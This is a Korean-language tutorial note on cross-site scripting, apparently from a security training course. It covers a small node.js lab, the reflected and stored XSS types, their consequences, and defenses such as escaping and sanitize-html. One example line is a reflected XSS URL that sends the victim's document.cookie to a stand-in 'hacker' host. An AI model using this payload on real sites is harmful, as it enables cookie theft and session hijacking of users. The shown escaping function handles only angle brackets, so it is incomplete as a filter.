# XSS (Cross Site Scripting)

#### 작성자 : [김우영](https://github.com/0x000613)

## 1. XSS란 무엇인가?

XSS는 Cross Site Scripting이라는 웹 공격기법의 약자입니다.

SQL Injection과 더불어 가장 흔하게 발생하며, 공격 시도 난이도에 비해 시스템에 막대한 영향을 줄 수 있는 취약점입니다.

XSS는 주로 웹 애플리케이션에서 일어나는 취약점으로 관리자가 아닌 권한이 없는 사용자가 웹 사이트에 악의적인 스크립트를 삽입하는 공격 기법입니다. XSS 공격은 대부분의 사용자가 글을 쓰고 읽을 수 있는 게시판에 주로 발생하지만, 사용자가 입력한 값을 웹페이지에 보여주는 항목(예를 들어 아이디, 닉네임등)에도 마찬가지로 적용이 가능합니다.

## 2. 실습

sample 디렉토리에 간단한 node.js 백엔드 서버를 생성한 후 진행합니다.

### 2.1 단순 HTML 문법을 사용한 공격 예시

1. `<h1>Hello, world</h1>`라는 일반적인 HTML `<h1>`태그를 사용하여 댓글을 작성했을 때 
   ![exam1](img\exam1.png)
2. `<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" />`라는 이미지 삽입 태그인`<img>`를 사용하여 댓글을 작성하였을 때
   ![exam2](img\exam2.png)

이런식으로 기본적인 HTML태그를 삽입하는것만으로도 사이트에 문제 될만한 행위가 가능합니다.

### 2.2 자바스크립트를 삽입했을 때

기본적인 HTML태그를 삽입하는 XSS의 경우 보편적으로는 사이트의 흐름이나 레이아웃을 깨뜨리는것에서 그치지만 악의적인 스크립트가 삽입되었을 경우에는 중대한 보안 문제가 발생할 수 있습니다.

1. `alert()`함수를 이용한 alert창 발생시키기
   ![exam3](D:\Documents\GitHub\Stuckyi-TechCamp\docs\2-week\XSS\img\exam3.png)

2. 사이트를 이동시키는 XSS 스크립트

   `location.href="https://naver.com"`스크립트를 삽입해 네이버로 강제 이동된 모습
   ![exam4](D:\Documents\GitHub\Stuckyi-TechCamp\docs\2-week\XSS\img\exam4.png)

## 3. XSS 공격 유형

방금 알아본 XSS 공격기법은은 크게 두가지 종류로 나눌 수 있습니다.

1. Reflected XSS
   ![ReflectedXSS](img\ReflectedXSS.png)

   

   Reflected XSS 공격은 사용자에게 입력 받은 값을 서버에서 되돌려주는 서비스에서 발생합니다.
   예를 들어 사용자가 입력한 검색어를 그대로 노출시켜주는 웹사이트 혹은 사용자가 입력한 값을 에러 메세지에 포함하여 보여주는 웹사이트에서 Reflected XSS 공격 스크립트가 삽입뇌면, 서버가 사용자의 입력 값을 응답할 때 스크립트가 실행됩니다.
   보통 Reflected XSS는 공격자가 악의적인 스크립트와 함께 URL을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악의적인 스크립트가 실행되어어 공격당하게됩니다.

   만약 다음과 같은 공격 스크립트가 실행되게 된다면 (실습 예제 2.2.2의 `location.href`를 활용한 스크립트)

   ```javascript
   http://testweb?search=<script>location.href("http://hacker/getcookie/value="+ document.cookie);</script>
   ```

   해커는 자신의 서버로 사용자의 `document.cookie`즉 사용자의 쿠키를 탈취하여 자신의 서버로 전송하여 저장할 수 있게됩니다.
   

2. Stored XSS
   ![storedXSS](img\storedXSS.png)

가장 널리 자주 사용되는 XSS 기법이며 공격 순서는 다음과 같습니다.

1. 게시판과같이 사용자가 입력한 정보가 DBMS에 저장되는 웹서비스를 타겟으로 발생합니다.

2. 공격자는 공격 스크립트를 게시판에 작성하게되고, 서버는 이를 DB에 저장하게됩니다.
3. 정상 유저가 게시판 목록을 로드할 때 서버는 DB에 저장되어있던 악성 스크립트를 반환하게됩니다.
4. 정상 유저의 웹브라우저가 DOM을 해석하는 단계에서 악성 스크립트가 실행됩니다.

## 4. XSS 방어 실패시 발생하는 문제점

1. 가장 큰 문제점은 대부분의 XSS 공격은 사용자나 관리자의 계정을 모르더라도 쿠키 탈취 및 세션 하이재킹으로 공격자가 회원 권한을 가지게 된다는 것입니다.
2. 자바스크립트는 웹 요소를 자유자재로 컨트롤이 가능하기에, 정상 유저에게 거짓된 페이지를 노출시키거나 사이트 이용 자체를 불가하도록 하는 등의 문제를 발생시킬 수 있습니다.

## 5. XXS 공격 대응 방법

1. 입력 값 검증
   사용자가 입력한 값에 대한 검증절차를 거치도록 하며, 절대로 사용자가 입력한 값 그대로를 사용하지 않습니다. 이는 SQL Injection과 마찬가지로 XSS 공격 대응의 가장 기본적인 방법입니다.

   다음 함수는 XSS를 필터링하는 정규표현식 함수입니다.

   ```javascript
   function XSSFilter(content) {
     return content.replace(/</g, "&lt;").replace(/>/g, "&gt;");
   }
   ```

2. Anti XSS, XSS 방어 라이브러리 사용
   이미 만들어진 Anti XSS 라이브러리를 사용함으로써 보다 수월하게 XSS 공격을 방어할 수 있으며.
   대부분의 라이브러리가 입력값 검증 기능 역시 제공합니다.
   - 대표적인 node.js의 Anti XSS 라이브러리는 [sanitize-html](https://www.npmjs.com/package/sanitize-html) 입니다.
